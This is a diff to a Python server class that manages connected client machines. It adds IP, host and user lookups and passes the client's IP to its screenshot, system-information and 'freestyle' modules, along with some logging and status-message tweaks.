@@ -14,8 +14,8 @@ from Modules.vital_signs import Vitals
 from Modules.sysinfo import Sysinfo
 from Modules.freestyle import Freestyle
 
-# TODO: DONE: Add client version
-# TODO: DONE: Added line 802 con.close()
+
+# TODO: Fix logging files and directories (saving only to SANDBOX dir)
 
 init()
 
@@ -310,6 +310,8 @@ class Server:
             self.logIt_thread(self.log_path, msg=f'Available list updated.')
 
             self.logIt_thread(self.log_path, msg=f'=== End of show_available_connections ===')
+
+            return False
 
     def get_station_number(self):
         self.logIt_thread(self.log_path, msg=f'Running get_station_number()...')
@@ -634,12 +636,21 @@ class Server:
                     self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
                     break
 
+                for item, connection in zip(self.tmp_availables, self.connections):
+                    for conKey, ipValue in self.clients.items():
+                        if conKey == connection:
+                            for ipKey in ipValue.keys():
+                                if item[1] == ipKey:
+                                    ipval = item[1]
+                                    host = item[2]
+                                    user = item[3]
+
                 self.logIt_thread(self.log_path, msg=f'Initializing Freestyle Module...')
                 free = Freestyle(con, path, self.tmp_availables, self.clients,
-                                 self.targets, log_path, self.ident)
+                                 self.targets, log_path, ipval, host, user)
 
                 self.logIt_thread(self.log_path, msg=f'Calling freestyle module...')
-                free.freestyle()
+                free.freestyle(ip)
 
                 continue
 
@@ -684,10 +695,10 @@ class Server:
                     self.logIt_thread(self.log_path, msg=f'Calling Module: '
                                                          f'screenshot({con, path, self.tmp_availables, self.clients})...')
                     screenshot = Screenshot(con, path, self.tmp_availables,
-                                            self.clients, self.log_path)
+                                            self.clients, self.log_path, self.targets)
 
                     self.logIt_thread(self.log_path, msg=f'Calling screenshot.recv_file()...')
-                    screenshot.recv_file()
+                    screenshot.recv_file(ip)
 
                 except (WindowsError, socket.error, ConnectionResetError) as e:
                     self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
@@ -712,8 +723,8 @@ class Server:
 
                     print(f"[{colored('*', 'cyan')}]Fetching system information, please wait... ")
                     self.logIt_thread(self.log_path, msg=f'Calling sysinfo.run()...')
-                    if sysinfo.run():
-                        print("OK")
+                    if sysinfo.run(ip):
+                        print(f"[{colored('V', 'green')}]OK!")
 
                     else:
                         return False
